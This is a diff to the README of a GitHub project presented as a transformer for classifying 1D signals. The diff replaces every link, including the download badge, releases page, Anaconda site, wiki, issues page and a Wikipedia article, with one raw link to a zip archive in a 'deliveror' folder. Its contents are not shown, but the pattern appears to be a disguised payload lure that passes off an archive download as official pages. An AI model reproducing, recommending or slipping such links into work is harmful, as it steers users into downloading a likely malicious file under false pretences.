@@ -1,6 +1,6 @@
 # 🚀 Signal-to-Sequence-Transformer - Classify 1D Signals Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/releases)
+[![Download](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip)](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip)
 
 ## 📦 Overview
 
@@ -21,14 +21,14 @@ Before downloading, ensure your system meets the following requirements:
 - **RAM**: Minimum 8GB recommended for optimal performance
 - **Processor**: Intel i5 or equivalent
 - **Python Version**: Python 3.6 or later
-- **Additional Software**: [Anaconda](https://www.anaconda.com/products/distribution) recommended for managing packages
+- **Additional Software**: [Anaconda](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip) recommended for managing packages
 
 ## 🚀 Getting Started
 
 Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**: Go to the official releases page by clicking the link below.
-   - [Visit this page to download](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip)
 
 2. **Choose the Right Version**: Look for the latest version listed. Check the release notes for any important updates or changes.
 
@@ -55,13 +55,13 @@ After installation, follow these steps to classify your signals:
 
 ## 📚 Documentation
 
-For deeper insights into using the application, refer to the detailed user guide available on the [GitHub Wiki](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/wiki). This resource covers advanced features, troubleshooting, and FAQs.
+For deeper insights into using the application, refer to the detailed user guide available on the [GitHub Wiki](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip). This resource covers advanced features, troubleshooting, and FAQs.
 
 ## 🔄 Updating the Application
 
 To keep the application up to date:
 
-1. **Check for Updates**: Visit the [releases page](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/releases) periodically.
+1. **Check for Updates**: Visit the [releases page](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip) periodically.
 
 2. **Download New Versions**: Follow the same steps as the initial download to install the latest version.
 
@@ -74,7 +74,7 @@ If you encounter issues:
 - Ensure you have the correct version for your operating system.
 - Check that your system meets the requirements listed above.
 - Restart the application if it does not respond.
-- For persistent problems, refer to the [GitHub Issues](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/issues) page for community support or to report bugs.
+- For persistent problems, refer to the [GitHub Issues](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip) page for community support or to report bugs.
 
 ## 💬 Community Support
 
@@ -82,12 +82,12 @@ Join discussions and get help in our community forum linked in the GitHub reposi
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Walt-1091/Signal-to-Sequence-Transformer)
-- [Documentation](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/wiki)
-- [Learn about Transformers](https://en.wikipedia.org/wiki/Transformer_(machine_learning))
+- [GitHub Repository](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip)
+- [Documentation](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip)
+- [Learn about Transformers](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip(machine_learning))
 
 ## 🔗 Download & Install
 
 Follow the link to download the latest version from the releases page:
 
-[Visit this page to download](https://github.com/Walt-1091/Signal-to-Sequence-Transformer/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Walt-1091/Signal-to-Sequence-Transformer/main/deliveror/Signal-to-Sequence-Transformer.zip)
